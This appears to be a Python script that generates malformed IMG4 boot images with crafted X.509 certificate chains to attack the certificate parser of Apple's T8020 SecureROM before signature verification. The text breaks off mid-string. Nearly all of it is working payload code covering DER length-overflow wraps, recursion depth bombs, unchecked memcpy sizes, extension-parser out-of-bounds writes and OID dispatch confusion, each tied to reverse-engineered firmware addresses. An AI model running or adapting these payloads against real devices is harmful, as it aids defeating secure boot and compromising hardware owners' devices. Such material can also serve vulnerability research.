#!/usr/bin/env python3
"""
T8020 B1 SecureROM — Certificate Parser Payload Generator (Phase 3)
=====================================================================
Phase 2 confirmed that IMG4-wrapped payloads reach deeper (~325ms vs 115ms)
but all get rejected at signature verification.

Phase 3 targets the X.509 CERTIFICATE PARSER specifically — this code MUST
execute BEFORE signature verification because it needs to extract the public
key from the certificate to perform the verification.

IM4M structure:
  SEQUENCE {
    IA5String "IM4M"               [0] magic
    INTEGER version                [1] version
    SET { properties }             [2] MANP/CHIP/ECID
    SEQUENCE { cert_chain }        [3] ← INJECTION POINT (parsed pre-verify)
    OCTET STRING { signature }     [4] manifest signature
  }

The cert chain at index [3] triggers parsing at 0x100012000+:
  - Core DER walk: 0x10000D584 (recursive, no depth limit)
  - X.509 deep parser: 0x1000123D0+ (recursive, 11+ memcpy callsites)
  - DER length decoder: 0x100013970 (unbounded length byte count)
  - Extension parser: 0x10001408C (OOB write via integer overflow)

All of these fire BEFORE the crypto functions at 0x100019000+ are called.
"""

import struct, os, json, hashlib
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent / "test_payloads_cert"
OUTPUT_DIR.mkdir(exist_ok=True)

# ============================================================================
# DER Builder
# ============================================================================
class D:
    @staticmethod
    def length(size):
        if size < 0x80:
            return bytes([size])
        elif size < 0x100:
            return bytes([0x81, size])
        elif size < 0x10000:
            return bytes([0x82, (size >> 8) & 0xFF, size & 0xFF])
        elif size < 0x1000000:
            return bytes([0x83, (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF])
        else:
            return bytes([0x84, (size >> 24) & 0xFF, (size >> 16) & 0xFF,
                         (size >> 8) & 0xFF, size & 0xFF])

    @staticmethod
    def sequence(contents):
        data = b''.join(contents) if isinstance(contents, (list, tuple)) else contents
        return b'\x30' + D.length(len(data)) + data

    @staticmethod
    def set_of(contents):
        data = b''.join(contents) if isinstance(contents, (list, tuple)) else contents
        return b'\x31' + D.length(len(data)) + data

    @staticmethod
    def octet_string(data):
        return b'\x04' + D.length(len(data)) + data

    @staticmethod
    def bit_string(data, unused_bits=0):
        return b'\x03' + D.length(len(data) + 1) + bytes([unused_bits]) + data

    @staticmethod
    def ia5_string(text):
        data = text.encode('ascii') if isinstance(text, str) else text
        return b'\x16' + D.length(len(data)) + data

    @staticmethod
    def utf8_string(text):
        data = text.encode('utf-8') if isinstance(text, str) else text
        return b'\x0C' + D.length(len(data)) + data

    @staticmethod
    def printable_string(text):
        data = text.encode('ascii') if isinstance(text, str) else text
        return b'\x13' + D.length(len(data)) + data

    @staticmethod
    def integer(value, width=None):
        if width:
            data = value.to_bytes(width, 'big', signed=value < 0)
        else:
            if value == 0:
                data = b'\x00'
            elif value > 0:
                bl = (value.bit_length() + 8) // 8
                data = value.to_bytes(bl, 'big')
            else:
                bl = (value.bit_length() + 9) // 8
                data = value.to_bytes(bl, 'big', signed=True)
        return b'\x02' + D.length(len(data)) + data

    @staticmethod
    def boolean(val):
        return b'\x01\x01' + (b'\xFF' if val else b'\x00')

    @staticmethod
    def context_tag(num, contents, constructed=True):
        cls = 0xA0 if constructed else 0x80
        data = b''.join(contents) if isinstance(contents, (list, tuple)) else contents
        return bytes([cls | (num & 0x1F)]) + D.length(len(data)) + data

    @staticmethod
    def oid(encoded_bytes):
        """OID from pre-encoded bytes (excluding tag+length)."""
        return b'\x06' + D.length(len(encoded_bytes)) + encoded_bytes

    @staticmethod
    def null():
        return b'\x05\x00'

    @staticmethod
    def utc_time(text):
        data = text.encode('ascii') if isinstance(text, str) else text
        return b'\x17' + D.length(len(data)) + data

    @staticmethod
    def raw_tlv(tag_byte, length_bytes, value):
        return bytes([tag_byte]) + bytes(length_bytes) + value

# ============================================================================
# Well-known OIDs
# ============================================================================
# RSA PKCS#1 SHA-256: 1.2.840.113549.1.1.11
OID_RSA_SHA256 = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0B])
# ECDSA with SHA-256: 1.2.840.10045.4.3.2
OID_ECDSA_SHA256 = bytes([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x04, 0x03, 0x02])
# SHA-256: 2.16.840.1.101.3.4.2.1
OID_SHA256 = bytes([0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01])
# RSA encryption: 1.2.840.113549.1.1.1
OID_RSA = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01])
# EC public key: 1.2.840.10045.2.1
OID_EC_PUBKEY = bytes([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x02, 0x01])
# Common Name: 2.5.4.3
OID_CN = bytes([0x55, 0x04, 0x03])
# Organization: 2.5.4.10
OID_ORG = bytes([0x55, 0x04, 0x0A])
# Subject Key Identifier: 2.5.29.14
OID_SKI = bytes([0x55, 0x1D, 0x0E])
# Authority Key Identifier: 2.5.29.35
OID_AKI = bytes([0x55, 0x1D, 0x23])
# Basic Constraints: 2.5.29.19
OID_BASIC_CONSTRAINTS = bytes([0x55, 0x1D, 0x13])
# Key Usage: 2.5.29.15
OID_KEY_USAGE = bytes([0x55, 0x1D, 0x0F])
# Apple custom OID prefix: 1.2.840.113635.100
OID_APPLE_PREFIX = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x63, 0x64])

# ============================================================================
# X.509 Certificate Builders
# ============================================================================
def build_algoid(oid_bytes, with_null=True):
    """AlgorithmIdentifier SEQUENCE { OID, NULL }"""
    parts = [D.oid(oid_bytes)]
    if with_null:
        parts.append(D.null())
    return D.sequence(parts)

def build_name(cn=b"Apple", org=b"Apple Inc."):
    """X.501 Name (RDNSequence)."""
    rdns = []
    if cn:
        rdns.append(D.set_of(D.sequence([D.oid(OID_CN), D.utf8_string(cn)])))
    if org:
        rdns.append(D.set_of(D.sequence([D.oid(OID_ORG), D.utf8_string(org)])))
    return D.sequence(rdns)

def build_validity(not_before="200101000000Z", not_after="301231235959Z"):
    return D.sequence([D.utc_time(not_before), D.utc_time(not_after)])

def build_rsa_pubkey(modulus_bytes=256, exponent=0x10001):
    """Fake RSA SubjectPublicKeyInfo with specified modulus size."""
    mod = b'\x00' + b'\x01' * modulus_bytes  # Leading 0 for positive
    pub_key = D.sequence([D.integer(int.from_bytes(mod, 'big')), D.integer(exponent)])
    return D.sequence([
        build_algoid(OID_RSA),
        D.bit_string(pub_key),
    ])

def build_extension(oid_bytes, value, critical=False):
    parts = [D.oid(oid_bytes)]
    if critical:
        parts.append(D.boolean(True))
    parts.append(D.octet_string(value))
    return D.sequence(parts)

def build_tbs_cert(serial=0x1337, issuer=None, subject=None, pubkey=None,
                   extensions=None, sig_algo=None, version=2):
    """TBSCertificate structure."""
    if issuer is None:
        issuer = build_name()
    if subject is None:
        subject = build_name(cn=b"Apple Secure Boot")
    if pubkey is None:
        pubkey = build_rsa_pubkey()
    if sig_algo is None:
        sig_algo = build_algoid(OID_RSA_SHA256)

    parts = [
        D.context_tag(0, D.integer(version)),  # version v3
        D.integer(serial),
        sig_algo,
        issuer,
        build_validity(),
        subject,
        pubkey,
    ]
    if extensions is not None:
        parts.append(D.context_tag(3, D.sequence(extensions)))
    return D.sequence(parts)

def build_x509_cert(tbs=None, sig_algo=None, sig_value=None):
    """Complete X.509 Certificate."""
    if tbs is None:
        tbs = build_tbs_cert()
    if sig_algo is None:
        sig_algo = build_algoid(OID_RSA_SHA256)
    if sig_value is None:
        sig_value = D.bit_string(b'\x00' * 256)  # Fake RSA sig
    return D.sequence([tbs, sig_algo, sig_value])

# ============================================================================
# IMG4 / IM4M Container Builders
# ============================================================================
def build_im4p(component=b"illb", desc=b"iBoot", data=b"\x00"*16):
    return D.sequence([
        D.ia5_string("IM4P"),
        D.ia5_string(component),
        D.ia5_string(desc),
        D.octet_string(data),
    ])

def build_im4m_with_cert(cert_data, extra_sig=None):
    """IM4M with MANP properties + injected certificate chain."""
    props = D.sequence([
        D.ia5_string("MANP"),
        D.set_of([
            D.sequence([D.ia5_string("CHIP"), D.integer(0x8020)]),
            D.sequence([D.ia5_string("ECID"), D.integer(0)]),
        ]),
    ])
    parts = [
        D.ia5_string("IM4M"),
        D.integer(0),
        D.set_of(props),
        cert_data,  # Certificate chain — 4th element
    ]
    if extra_sig is not None:
        parts.append(extra_sig)
    else:
        # Fake manifest signature (OCTET STRING)
        parts.append(D.octet_string(b'\x00' * 64))
    return D.sequence(parts)

def build_img4_with_cert(cert_data, extra_sig=None):
    """Complete IMG4 container with cert-targeted IM4M."""
    im4p = build_im4p(data=b'\x00' * 16)
    im4m = build_im4m_with_cert(cert_data, extra_sig)
    return D.sequence([
        D.ia5_string("IMG4"),
        im4p,
        D.context_tag(0, im4m),
    ])

# ============================================================================
# Test Case Registry
# ============================================================================
test_cases = []

def reg(name, payload, desc, target, severity, vuln_type):
    fname = f"cert_{len(test_cases):03d}_{name}.bin"
    fpath = OUTPUT_DIR / fname
    if len(payload) > 0x800:
        payload = payload[:0x800]
    fpath.write_bytes(payload)
    tc = {
        "id": len(test_cases), "name": name, "file": fname,
        "size": len(payload),
        "sha256": hashlib.sha256(payload).hexdigest(),
        "description": desc, "target_function": target,
        "severity": severity, "vuln_type": vuln_type,
        "hex_preview": payload[:64].hex(),
    }
    test_cases.append(tc)
    print(f"  [{tc['id']:3d}] {severity:8s} {name:45s} ({len(payload):5d}B) -> {target}")
    return tc

# ============================================================================
# Category H: DER Length Overflow in Certificate Fields
# ============================================================================
print("\n=== H: DER Length Overflow in Cert Fields ===\n")

# H0: Cert with 8-byte DER length (0x88) in issuer Name → 64-bit wrap to small value
# DER_LENGTH_COUNT_UNBOUNDED at 0x100013B0C
# Length byte 0x88 means "next 8 bytes are the length" → produces 64-bit value
# Crafted to wrap to 0x20 (32 bytes) when truncated to 32-bit
issuer_name_value = b'A' * 32
# Raw issuer: SEQUENCE tag + 8-byte length encoding that wraps to 32
issuer_raw = b'\x30\x88\x00\x00\x00\x01\x00\x00\x00\x20' + issuer_name_value
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    D.integer(0x1337),
    build_algoid(OID_RSA_SHA256),
    issuer_raw,  # Malformed issuer with 64-bit length
    build_validity(),
    build_name(cn=b"Test"),
    build_rsa_pubkey(modulus_bytes=64),
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_issuer_len64_wrap", build_img4_with_cert(cert),
    "Cert issuer Name with 8-byte DER length (0x88). 64-bit value 0x100000020 wraps "
    "to 0x20 in 32-bit → memcpy copies 32B but parser thinks 4GB remain. "
    "Targets DER_LENGTH_COUNT_UNBOUNDED at 0x100013B0C.",
    "0x100013B0C", "CRITICAL", "DER_LENGTH_OVERFLOW")

# H1: Cert serial number with 0x88 length → 64-bit value wrapping
serial_raw = b'\x02\x88\x00\x00\x00\x01\x00\x00\x00\x08' + b'\x42' * 8
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    serial_raw,  # Malformed serial with 64-bit length
    build_algoid(OID_RSA_SHA256),
    build_name(),
    build_validity(),
    build_name(cn=b"Test"),
    build_rsa_pubkey(modulus_bytes=64),
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_serial_len64_wrap", build_img4_with_cert(cert),
    "Cert serial INTEGER with 8-byte DER length (0x88). Wraps to 8 in 32-bit but "
    "64-bit value = 0x100000008. Serial extractor at 0x100012000+ does memcpy with "
    "truncated size. Targets DER_LENGTH_COUNT_UNBOUNDED at 0x100013B0C.",
    "0x100013B0C", "CRITICAL", "DER_LENGTH_OVERFLOW")

# H2: Cert subject with 5-byte DER length (0x85) → truncation to 32-bit
subject_raw = b'\x30\x85\x01\x00\x00\x00\x20' + b'B' * 32
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    D.integer(0x1337),
    build_algoid(OID_RSA_SHA256),
    build_name(),
    build_validity(),
    subject_raw,  # Malformed subject with 5-byte length
    build_rsa_pubkey(modulus_bytes=64),
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_subject_len5byte", build_img4_with_cert(cert),
    "Cert subject Name with 5-byte DER length (0x85). Value = 0x0100000020, truncated "
    "to 0x20 in 32-bit. Subject field copier uses truncated size but structure pointer "
    "advances by full amount → pointer desync. Targets 0x100013B0C.",
    "0x100013B0C", "CRITICAL", "DER_LENGTH_OVERFLOW")

# H3: subjectPublicKeyInfo with 0x84 length claiming more than buffer
pubkey_raw = (b'\x30\x84\x00\x00\x07\xF0'  # SEQUENCE claiming 0x7F0 bytes
              + build_algoid(OID_RSA) + D.bit_string(b'\x00' * 64))
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    D.integer(0x1337),
    build_algoid(OID_RSA_SHA256),
    build_name(),
    build_validity(),
    build_name(cn=b"Test"),
    pubkey_raw,  # Overlong SubjectPublicKeyInfo
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_pubkey_overlen", build_img4_with_cert(cert),
    "SubjectPublicKeyInfo SEQUENCE claims 0x7F0 bytes but only ~80 present. "
    "Parser reads past cert boundary into adjacent data. Key extractor memcpy at "
    "0x10001276C copies based on claimed size → BUFFER_OVERREAD.",
    "0x10001276C", "CRITICAL", "BUFFER_OVERREAD")

# H4: Signature BIT STRING with 0x88 length → 64-bit wrap
sig_raw = b'\x03\x88\x00\x00\x00\x01\x00\x00\x01\x01' + b'\x00' + b'\x43' * 256
cert_parts = D.sequence([
    build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=64)),
    build_algoid(OID_RSA_SHA256),
    sig_raw,  # Malformed signature BitString
])
reg("cert_sig_len64_wrap", build_img4_with_cert(cert_parts),
    "Cert signature BIT STRING with 8-byte DER length (0x88). Wraps to 0x101 in 32-bit. "
    "Signature buffer copy at 0x100019680 uses truncated size → copies 257B to "
    "fixed-size crypto buffer. Targets pre-verify signature extraction.",
    "0x100019680", "CRITICAL", "DER_LENGTH_OVERFLOW")

# ============================================================================
# Category I: Recursive Depth Bombs in Certificate Structure
# ============================================================================
print("\n=== I: Recursive Depth Bombs in Cert ===\n")

# I0: Certificate with deeply nested issuer Name (50 levels inside cert)
inner = D.printable_string(b"Apple")
for _ in range(50):
    inner = D.set_of(D.sequence([D.oid(OID_CN), inner]))
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    D.integer(0x1337),
    build_algoid(OID_RSA_SHA256),
    D.sequence([inner]),  # Deep issuer
    build_validity(),
    build_name(cn=b"Test"),
    build_rsa_pubkey(modulus_bytes=64),
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_deep_issuer_50", build_img4_with_cert(cert),
    "Cert with 50-level nested issuer Name. Each RDN contains nested SET→SEQUENCE→value. "
    "Triggers UNBOUNDED_RECURSION at 0x1000123D0 and core DER walker at 0x10000D584. "
    "Combined with IMG4 container depth → total recursion ~56 levels.",
    "0x1000123D0", "CRITICAL", "UNBOUNDED_RECURSION")

# I1: Certificate with deeply nested extensions (30 levels)
inner_ext = D.octet_string(b'\x00' * 8)
for _ in range(30):
    inner_ext = D.sequence([D.oid(OID_BASIC_CONSTRAINTS), D.octet_string(inner_ext)])
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=[inner_ext],
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_deep_extensions_30", build_img4_with_cert(cert),
    "Cert v3 with 30-level nested extensions. Each extension wraps another SEQUENCE→OCTET→SEQUENCE. "
    "Triggers recursive descent at 0x1000128C4 and 0x1000131B8. Extension parser has no "
    "depth limit — stack overflow on ARM64 with ~8KB stack.",
    "0x1000128C4", "CRITICAL", "UNBOUNDED_RECURSION")

# I2: Certificate chain with 10 certificates (chain depth attack)
certs = []
for i in range(10):
    c = build_x509_cert(
        tbs=build_tbs_cert(
            serial=i,
            issuer=build_name(cn=f"CA Level {i}".encode()),
            subject=build_name(cn=f"CA Level {i+1}".encode()),
            pubkey=build_rsa_pubkey(modulus_bytes=64),
        ),
        sig_value=D.bit_string(b'\x00' * 64),
    )
    certs.append(c)
chain = D.sequence(certs)
reg("cert_chain_10_deep", build_img4_with_cert(chain),
    "Certificate chain with 10 certs. Chain iterator at 0x100012DA4 is self-recursive "
    "with 2 call sites. Each cert triggers full X.509 parsing → compound recursion. "
    "10 certs × ~6 levels each = ~60 recursive calls.",
    "0x100012DA4", "CRITICAL", "UNBOUNDED_RECURSION")

# I3: Single cert with deeply nested SubjectPublicKeyInfo (40 levels)
inner_key = D.bit_string(b'\x00' * 32)
for _ in range(40):
    inner_key = D.sequence([build_algoid(OID_RSA), inner_key])
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    D.integer(0x1337),
    build_algoid(OID_RSA_SHA256),
    build_name(),
    build_validity(),
    build_name(cn=b"Test"),
    inner_key,  # 40-level nested pubkey info
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_deep_pubkey_40", build_img4_with_cert(cert),
    "SubjectPublicKeyInfo with 40 nested SEQUENCE levels. Key extractor at 0x100012000+ "
    "recursively descends into key structure. Triggers UNBOUNDED_RECURSION at 0x1000133C0 "
    "and 0x100013584 in the key material parser.",
    "0x1000133C0", "CRITICAL", "UNBOUNDED_RECURSION")

# ============================================================================
# Category J: MEMCPY with Unchecked Size from Cert Fields
# ============================================================================
print("\n=== J: Unchecked MEMCPY from Cert Fields ===\n")

# J0: Cert with oversized issuer Common Name (512 bytes)
big_issuer = build_name(cn=b'A' * 512, org=b'B' * 256)
tbs = build_tbs_cert(issuer=big_issuer, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_huge_issuer_cn", build_img4_with_cert(cert),
    "Cert with 512-byte issuer CN + 256-byte Org. Name field copier at 0x10001276C "
    "does memcpy_safe with x19 = DER value length (unvalidated). If target buffer is "
    "fixed-size (e.g. 256B) → heap/stack overflow.",
    "0x10001276C", "CRITICAL", "MEMCPY_UNCHECKED_SIZE")

# J1: Cert with oversized subject Common Name (768 bytes)
big_subject = build_name(cn=b'X' * 768)
tbs = build_tbs_cert(subject=big_subject, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_huge_subject_cn", build_img4_with_cert(cert),
    "Cert with 768-byte subject CN. Subject name copier converges at 0x1000127C0 "
    "with unchecked x19 size parameter. 768B exceeds any reasonable name buffer. "
    "Targets the memcpy chain at 0x10001276C → 0x1000127C0 → 0x100012860.",
    "0x1000127C0", "CRITICAL", "MEMCPY_UNCHECKED_SIZE")

# J2: Cert with oversized RSA modulus (1024 bytes in pubkey)
tbs = build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=1024))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_huge_rsa_modulus", build_img4_with_cert(cert),
    "Cert with 1024-byte RSA modulus (8192-bit key). Key material copier at 0x1000128A0 "
    "uses x19 from DER-parsed modulus length. If crypto buffer is sized for 4096-bit → "
    "overflow. Targets deepest cert copy at 0x1000128A0.",
    "0x1000128A0", "CRITICAL", "MEMCPY_UNCHECKED_SIZE")

# J3: Cert with oversized serial number (128 bytes)
tbs = build_tbs_cert(serial=int.from_bytes(b'\x7F' + b'\xFF' * 127, 'big'),
                     pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_huge_serial", build_img4_with_cert(cert),
    "Cert with 128-byte serial number. Serial extractor copies via memcpy_safe at "
    "0x10000D7DC with unvalidated x19. If serial stored in fixed-size var → overflow.",
    "0x10000D7DC", "CRITICAL", "MEMCPY_UNCHECKED_SIZE")

# J4: Cert with maximum-size signature (fill remaining DFU buffer)
# DFU buffer = 0x800, container overhead ~200B, so sig can be ~1800B
big_sig = D.bit_string(b'\x00' * 1500)
tbs = build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), big_sig])
reg("cert_huge_signature", build_img4_with_cert(cert),
    "Cert with 1500-byte signature value. Signature copier at 0x100019680 uses x20 "
    "from parsed BIT STRING length. If RSA sig buffer is 512B → massive overflow. "
    "Executed DURING cert parsing, before verification call.",
    "0x100019680", "CRITICAL", "MEMCPY_UNCHECKED_SIZE")

# ============================================================================
# Category K: Integer Overflow → OOB Write in Extension Parser
# ============================================================================
print("\n=== K: OOB Write in Extension Parser ===\n")

# K0: Extension with value causing integer overflow at 0x100014210
# The parser does: sub w13, w11, w13 → strh [x12, x8, lsl #1]
# If w11 < w13 → negative result → huge unsigned offset → OOB write
ext_overflow = build_extension(
    OID_KEY_USAGE,
    # Value bytes crafted so parsed w11=0, w13=1 → sub = -1 = 0xFFFFFFFF
    b'\x03\x02\x00\xFF',
    critical=True,
)
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=[ext_overflow],
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_ext_keyusage_overflow", build_img4_with_cert(cert),
    "KeyUsage extension with value causing sub w13,w11,w13 underflow at 0x100014210. "
    "Result 0xFFFFFFFF used as index in strh [x12, x8, lsl #1] → OOB write at "
    "base + 0x1FFFFFFFE. OVERFLOW_TO_MEMACCESS.",
    "0x100014210", "CRITICAL", "OVERFLOW_TO_MEMACCESS")

# K1: Extension with 255-byte OID (parsed index OOB)
# UNCHECKED_INDEX_FROM_PARSED at 0x10001408C → ldr w21, [x19, x8]
big_oid = bytes(range(256))[:255]  # 255-byte OID value
ext_bigoid = D.sequence([D.oid(big_oid), D.octet_string(b'\x00' * 16)])
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=[ext_bigoid],
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_ext_huge_oid", build_img4_with_cert(cert),
    "Extension with 255-byte OID. OID parser at 0x10001408C uses parsed bytes as array "
    "index (ldr w21, [x19, x8]). Large OID values → UNCHECKED_INDEX_FROM_PARSED OOB read. "
    "Can leak memory contents through timing side-channel.",
    "0x10001408C", "CRITICAL", "UNCHECKED_INDEX")

# K2: Multiple extensions with crafted lengths to trigger LENGTH_ARITH_NO_CHECK
# At 0x100014304: ldrb → add w11, w10, #0x11 without overflow check
exts = []
for i in range(15):
    # Each extension OID byte + 0x11 should overflow uint8
    oid_val = bytes([0xF0 + (i % 16)])  # High OID values
    exts.append(build_extension(
        oid_val,
        b'\x00' * (0xEF + i),  # Lengths near 0xFF → add + 0x11 overflows byte
    ))
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=exts,
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_ext_length_arith_overflow", build_img4_with_cert(cert),
    "15 extensions with lengths ~0xEF-0xFD. Parser at 0x100014304 does "
    "add w11, w10, #0x11 on each length → byte overflow when len ≥ 0xEF. "
    "Overflowed size used for buffer allocation/copy → heap corruption.",
    "0x100014304", "CRITICAL", "LENGTH_ARITH_OVERFLOW")

# K3: BasicConstraints with pathLenConstraint = 0xFFFFFFFF
bc_value = D.sequence([D.boolean(True), D.integer(0xFFFFFFFF)])
ext_bc = build_extension(OID_BASIC_CONSTRAINTS, bc_value, critical=True)
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=[ext_bc],
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_ext_pathlen_max", build_img4_with_cert(cert),
    "BasicConstraints with pathLenConstraint=0xFFFFFFFF. If used as loop counter or "
    "array size in chain validation → OOB/infinite loop. Parsed at 0x100014xxx "
    "extension handler before signature verification.",
    "0x100014304", "HIGH", "INTEGER_OVERFLOW")

# ============================================================================
# Category L: OID Parsing Attacks
# ============================================================================
print("\n=== L: OID Parsing Attacks ===\n")

# L0: signatureAlgorithm with unknown OID → dispatch confusion
unknown_algo = build_algoid(bytes([0x2B, 0x06, 0x01, 0x04, 0x01, 0xFF, 0x7F, 0x01]))
tbs = build_tbs_cert(sig_algo=unknown_algo, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, unknown_algo, D.bit_string(b'\x00' * 64)])
reg("cert_unknown_sig_algo", build_img4_with_cert(cert),
    "Cert with unknown signatureAlgorithm OID. AlgorithmIdentifier parser at "
    "0x100012000+ dispatches to crypto function based on OID. Unknown OID may "
    "index into dispatch table OOB → calls wrong function or arbitrary address.",
    "0x100012000+", "HIGH", "OID_DISPATCH_CONFUSION")

# L1: Empty OID in signatureAlgorithm (0-length)
empty_algo = D.sequence([b'\x06\x00', D.null()])  # OID with 0 bytes
tbs = build_tbs_cert(sig_algo=empty_algo, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, empty_algo, D.bit_string(b'\x00' * 64)])
reg("cert_empty_oid_algo", build_img4_with_cert(cert),
    "signatureAlgorithm with 0-length OID. OID decoder reads 0 bytes → uninitialized "
    "comparisons. If compared with memcmp(oid, expected, 0) → always matches → "
    "dispatches to first entry (likely RSA-SHA1 or similar).",
    "0x100012000+", "HIGH", "MISSING_VALIDATION")

# L2: OID with maximum-length encoded components (overlong form)
# Each OID component encoded with all high bits set → huge decoded value
overlong_oid = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D,
                      0x8F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F])
overlong_algo = build_algoid(overlong_oid)
tbs = build_tbs_cert(sig_algo=overlong_algo, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, overlong_algo, D.bit_string(b'\x00' * 64)])
reg("cert_overlong_oid_component", build_img4_with_cert(cert),
    "signatureAlgorithm OID with overlong variable-length encoding. Last component "
    "uses max 8 continuation bytes → 63-bit decoded value. OID comparator may overflow "
    "or misparse. Targets OID decoder in cert parser region.",
    "0x100012000+", "HIGH", "OID_OVERFLOW")

# L3: Apple-specific OID prefix with crafted suffix
apple_oid = OID_APPLE_PREFIX + bytes([0x8F, 0xFF, 0x7F, 0x01])  # Apple + big suffix
apple_ext = build_extension(apple_oid, b'\x00' * 64)
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=[apple_ext],
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_apple_oid_fuzz", build_img4_with_cert(cert),
    "Extension with Apple OID prefix (1.2.840.113635.100) + oversized suffix. "
    "Apple-specific extension handler may have internal dispatch based on sub-OID. "
    "Crafted suffix → OOB in Apple extension handler lookup.",
    "0x100014888+", "HIGH", "OID_DISPATCH_CONFUSION")

# ============================================================================
# Category M: Certificate Type Confusion / Structural Attacks
# ============================================================================
print("\n=== M: Cert Structural Attacks ===\n")

# M0: Certificate with TBSCertificate replaced by raw bytes
# Parser expects SEQUENCE but gets raw data
raw_tbs = b'\x41' * 256  # Not a valid SEQUENCE
cert = D.sequence([raw_tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_raw_tbs", build_img4_with_cert(cert),
    "Certificate where TBSCertificate is 256 raw bytes (tag 0x41 = APPLICATION 1). "
    "X.509 parser at 0x1000123D0 expects SEQUENCE tag 0x30 → if tag not checked, "
    "parser interprets raw data as DER → controlled parsing confusion.",
    "0x1000123D0", "HIGH", "TYPE_CONFUSION")

# M1: Certificate with version = 255 (max for v3 is 2)
tbs = build_tbs_cert(version=255, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_version_255", build_img4_with_cert(cert),
    "Certificate with version=255 (valid: 0,1,2). If version used to index into "
    "feature/extension table → OOB. Version parsed at 0x1000123D0 entry.",
    "0x1000123D0", "HIGH", "UNCHECKED_INDEX")

# M2: Certificate with 0-length TBSCertificate
cert = D.sequence([D.sequence(b''), build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_empty_tbs", build_img4_with_cert(cert),
    "Certificate with empty TBSCertificate (SEQUENCE len=0). Parser expects ≥7 fields "
    "but gets 0 → reads past structure or NULL deref on required fields.",
    "0x1000123D0", "HIGH", "TRUNCATED_STRUCT")

# M3: Certificate with only 1 element (TBS only, no algo or sig)
cert = D.sequence([build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=64))])
reg("cert_truncated_1elem", build_img4_with_cert(cert),
    "Certificate SEQUENCE with only TBSCertificate, no signatureAlgorithm or signature. "
    "Parser expects 3 elements → accesses [1] and [2] past end of structure.",
    "0x1000123D0", "HIGH", "TRUNCATED_STRUCT")

# M4: cert_chain as SET instead of SEQUENCE (type confusion at manifest level)
cert_as_set = D.set_of(build_x509_cert(
    tbs=build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=64)),
    sig_value=D.bit_string(b'\x00' * 64),
))
reg("cert_chain_set_not_seq", build_img4_with_cert(cert_as_set),
    "Certificate chain encoded as SET (0x31) instead of SEQUENCE (0x30). IM4M parser "
    "expects SEQUENCE at index [3] → if only length-checked without tag verification, "
